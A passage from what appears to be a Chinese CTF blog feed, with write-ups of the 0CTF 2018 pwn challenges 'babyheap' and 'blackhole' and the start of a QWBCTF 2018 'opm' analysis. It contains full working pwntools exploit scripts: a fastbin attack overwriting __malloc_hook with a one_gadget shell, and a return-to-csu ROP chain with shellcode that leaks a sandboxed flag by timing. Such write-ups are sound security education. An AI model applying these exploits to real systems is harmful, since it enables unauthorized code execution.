title="babyheap"></a>babyheap</h1><p>此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是aligned<em>hook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\</em>_malloc_hook为one_gadget，从而拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#flag&#123;have_fun_with_fastbin&#125;</span></span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line">p = remote(<span class="string">"202.120.7.204"</span>,<span class="number">127</span>)<span class="comment">#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 </span></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xc1'</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">1</span>)        <span class="comment"># 0 2 3</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Chunk[2]: '</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">main_arena = leak_addr - <span class="number">88</span></span><br><span class="line">print(<span class="string">'main_arena is '</span> + hex(main_arena))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.24.so'</span>)<span class="comment">#('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libcbase = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 (2==3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4</span></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 </span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6</span></span><br><span class="line">allocate(<span class="number">0x48</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">5</span>)       <span class="comment"># 0 1 2 3 4 6 7</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6 7 8(6==8)</span></span><br><span class="line">delete(<span class="number">8</span>)       </span><br><span class="line">update(<span class="number">6</span>, <span class="number">0x8</span>, p64(<span class="number">0x60</span>))</span><br><span class="line">allocate(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x8</span>, p64(main_arena + <span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 </span></span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"></span><br><span class="line">malloc_hook_head = main_arena - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">update(<span class="number">9</span>, <span class="number">0x58</span>, p64(<span class="number">0</span>)*<span class="number">7</span> + p64(malloc_hook_head) + p64(<span class="number">0</span>) + p64(leak_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x40</span>)</span><br><span class="line">one_gadget = libcbase + <span class="number">0x3f35a</span></span><br><span class="line">update(<span class="number">10</span>, <span class="number">8</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#delete(3)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3f306 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3f35a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xd695f execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45526 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4557a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1651 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf24cb execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="blackhole"><a href="#blackhole" class="headerlink" title="blackhole"></a>blackhole</h1><p>此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。</p><p>并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。  并且发现自己的汇编语言写的真是渣…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random, string, subprocess, os, sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">check_result = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(offset, guess, method)</span>:</span></span><br><span class="line">    <span class="comment"># p = process('./blackhole')</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, open('debug'))</span></span><br><span class="line">    <span class="keyword">global</span> check_result</span><br><span class="line">    check_result = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        p = remote(<span class="string">'202.120.7.203'</span>, <span class="number">666</span>)</span><br><span class="line">        <span class="comment"># p = remote('127.0.0.1', 5555)</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">()</span>:</span></span><br><span class="line">            chal = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> chal.encode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">for</span> c1 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">for</span> c3 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                        <span class="keyword">for</span> c4 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                            sol = <span class="string">''</span>.join(map(chr, (c1, c2, c3, c4)))</span><br><span class="line">                            <span class="keyword">if</span> sha256(chal + sol).hexdigest().startswith(<span class="string">'00000'</span>):</span><br><span class="line">                                p.send(sol)</span><br><span class="line">                                <span class="keyword">print</span> sha256(chal + sol).hexdigest()</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pow() == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    output_buffer = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    elf = ELF(<span class="string">'./blackhole'</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">    pop6 = <span class="number">0x400A4A</span> </span><br><span class="line">    mov_call = <span class="number">0x400A30</span></span><br><span class="line">    bss = <span class="number">0x601100</span></span><br><span class="line">    pop_rbp = <span class="number">0x4007c0</span></span><br><span class="line">    leave_ret = <span class="number">0x4009A5</span>  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callfunc</span><span class="params">(func, arg1, arg2, arg3)</span>:</span></span><br><span class="line">        rop = p64(pop6)</span><br><span class="line">        rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1)</span><br><span class="line">        rop += p64(mov_call)</span><br><span class="line">        <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">'a'</span>*<span class="number">40</span></span><br><span class="line">    rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, <span class="number">320</span>) </span><br><span class="line">    rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    rop += p64(pop_rbp) + p64(bss - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    rop = rop.ljust(<span class="number">0x100</span>, <span class="string">'a'</span>)</span><br><span class="line">    <span class="comment"># p.send(rop)</span></span><br><span class="line">    output_buffer += rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    shellcode = shellcraft.open(<span class="string">'/home/blackhole/flag'</span>, constants.O_RDONLY)</span><br><span class="line">    <span class="comment"># shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY)</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="string">'rax'</span>, bss, <span class="number">60</span>)</span><br><span class="line">    shellcode += <span class="string">"mov al, byte ptr [%s]; cmp al, %s;"</span> % (hex(<span class="number">0x601100</span> + offset), hex(guess))</span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'equal'</span>:</span><br><span class="line">        shellcode += <span class="string">"jne Exit;"</span> </span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">'smaller'</span>:</span><br><span class="line">        shellcode += <span class="string">"jl Exit;"</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">"jg Exit;"</span> </span><br><span class="line"></span><br><span class="line">    shellcode += <span class="string">"Loop:"</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="number">0</span>, bss + <span class="number">0x100</span>, <span class="number">0x10</span>) <span class="comment"># just block the program</span></span><br><span class="line">    shellcode += <span class="string">'jmp Loop;'</span></span><br><span class="line">    shellcode += <span class="string">'Exit:'</span> + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bss_rop = callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'alarm'</span>], <span class="number">1</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, constants.SYS_mprotect)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'alarm'</span>], <span class="number">0x601000</span>, <span class="number">0x1000</span>, <span class="number">0x7</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, len(shellcode))</span><br><span class="line">    bss_rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    bss_rop += p64(bss)</span><br><span class="line">    <span class="comment">#p.send(bss_rop)</span></span><br><span class="line">    <span class="comment"># print 'len(bss_rop) is ' + hex(len(bss_rop))</span></span><br><span class="line">    output_buffer += bss_rop</span><br><span class="line">    <span class="comment"># p.send('\x05' + 'a' * constants.SYS_mprotect)</span></span><br><span class="line">    <span class="comment"># output_buffer += '\x05' + 'a' * constants.SYS_mprotect</span></span><br><span class="line">    output_buffer += <span class="string">'\x85'</span> + <span class="string">'a'</span> * constants.SYS_mprotect</span><br><span class="line">    output_buffer += shellcode</span><br><span class="line"></span><br><span class="line">    old_time = time.time()</span><br><span class="line">    <span class="comment"># print len(output_buffer)</span></span><br><span class="line">    p.send(output_buffer.ljust(<span class="number">0x800</span>, <span class="string">'f'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            p.sendline(<span class="string">'hack you'</span>)</span><br><span class="line">            print(<span class="string">"hack you"</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">3</span>:</span><br><span class="line">        check_result = <span class="keyword">True</span></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binSearch</span><span class="params">(offset, start, end)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> start &lt;  end:</span><br><span class="line">        <span class="keyword">print</span> start, end, chr(start), chr(end)</span><br><span class="line">        medium = (start + end) / <span class="number">2</span></span><br><span class="line">        check(offset, medium, <span class="string">'equal'</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            <span class="keyword">return</span> medium</span><br><span class="line">        </span><br><span class="line">        check(offset, medium, <span class="string">"smaller"</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            start, end = medium, end</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start, end = start, medium</span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag), <span class="number">60</span>):</span><br><span class="line">    result = binSearch(i, <span class="number">33</span>, <span class="number">128</span>)</span><br><span class="line">    flag += chr(result)</span><br><span class="line">    log.info(<span class="string">"flag is "</span> + flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/0CTF2018/0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;靠着 BLUECAKE@DUBHE 大佬，队
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>QWBCTF 2018 PWN 部分题解</title>
    <link href="http://p4nda.top/2018/03/27/QWB2018/"/>
    <id>http://p4nda.top/2018/03/27/QWB2018/</id>
    <published>2018-03-27T06:54:50.000Z</published>
    <updated>2018-03-27T09:49:22.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>本题逻辑比较清晰，仅有两个功能，添加成员和展示全部成员两个功能。</p><p><img src="/img/QWB2018/1_1.png" alt=""></p><p>其中，在BSS段上维护了一个数组，用于存储成员的数据结构。该数据结构包括两个从堆上申请的数据块组成。</p><p>分别是定长为0x30（new（0x20））的节点，和由malloc（len(s)）申请的动态节点构成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8             16          24        </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| function ptr |   address  |   length   |   int    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>添加用户函数主要就是维护这个变量</p><p><img src="/img/QWB2018/1_2.png" alt=""></p><p>展示全部成员就是利用function ptr来打印全部成员变量的内容。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题在add_role函数中，十分明显的使用gets(s)留出了两个栈溢出漏洞，但是此题开启了全部保护，让所有地址均位置。并且gets函数有一个非常明显的弊端，会在输入的最后加入’\0’，泄露更加困难。</p><p>其实，这道题主要考察堆地址的构造，因为和堆块大小关系并不大。</p><h3 id="堆地址泄露"><a href="#堆地址泄露" class="headerlink" title="堆地址泄露"></a>堆地址泄露</h3><p>首先，申请一个较大的块，保证不出现溢出，这样使下一块分配地址是，输入内容部分会申请得到以00结尾的字符串。</p><p>然后，申请一个包含溢出的块，如’b’*0x80+’\x20’，如此一来，会把本来要写到节点堆块的数据向上写入，写到以0020结尾的段地址空间去，由于此题在前方已申请了大量空间，所以保证以0020为结尾的块，不会出现由于未mmap，导致的段错误。这样相当于在一个末位2字节已知的地址，写入了第二个数据结构内容部分的地址。</p><p>然后，申请一个刚好为0x80的块，如’c’*0x80，这样，gets输入的\0会覆盖要写入的地址，这样就会将地址写入到最低一字节为00的地址去，根据堆地址的构造，这个地方恰好属于第二个块的内容部分，且被’b’填充，当写入后，如果可以利用printf等函数打印出第二个块内容，就可以成功泄露堆地址了。当然，直接show一定是不行的。</p><p>最后，再次申请一个数据块，在第一部分输入内容时并不溢出而在第二个输入数字处溢出一个字节，使这个地址变成第二个块地址写入的0020结尾的地址，此题恰好保证分配过程中前6字节数据不变，在写入int后，就会执行打印操作，也就是打印第二块的内容，顺便打印出了堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'a'</span>*<span class="number">0x78</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x80</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">0x18</span>,<span class="string">'d'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>)</span><br></pre></td></tr></table></figure><p>有了堆地址以后，相当于堆分配的全部地址均可预测。(所谓预测，就是写到每步的时候动态调一下，然后直接找当时的内存做减法)</p><p>###PIE泄露</p><p>首先，可以利用堆地址反向解析出第一块自定义的存储print函数的堆块地址，将这个写入到某堆块内容中去，而这个新申请堆块的值也是可以预测的，因此，再申请一块堆，使其溢出溢出到前一个内容块的地址-0x08处去，相当于在前一块堆上构造了一个伪造的节点，这样就可以泄露print函数的地址，也就相当于PIE地址。</p><h3 id="libc地址泄露"><a href="#libc地址泄露" class="headerlink" title="libc地址泄露"></a>libc地址泄露</h3><p>与PIE泄露类似，通过PIE，可以获取puts函数的got表地址，利用这个地址已经同样的泄露方法，可以获取libc的地址。</p><h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>控制流劫持的方法与这个方法一样，同样在堆上构造一个伪造的块，其中填入one_gadget的地址，再次申请一个堆块，覆盖返回值为上一块的内容，最后调用show函数，就可以执行one_gadget了，从而拿到shell。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 